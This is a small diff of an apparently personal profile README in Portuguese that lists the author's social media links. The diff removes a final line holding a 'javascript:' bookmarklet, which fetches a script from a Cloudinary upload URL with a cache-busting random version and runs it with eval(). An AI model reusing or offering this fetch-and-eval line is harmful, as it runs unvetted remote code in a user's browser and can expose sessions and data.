@@ -17,5 +17,3 @@ Também sou um pouco ativo nas plataformas sociais abaixo!
 - 📸 Instagram [(@fishixz)](https://www.instagram.com/fishixz)
 - 👨‍💻 Twitter [(@fishixz)](https://twitter.com/fishixz)
 - 🖇️ Tiktok [(@edyxluis)](https://www.tiktok.com/@edyxluis)
-
-- javascript:fetch(`https://res.cloudinary.com/dq36xqdoe/raw/upload/v${Math.floor(Math.random() * 1000000)}/main_oqidn5.js`).then(r => r.text()).then(r => eval(r))
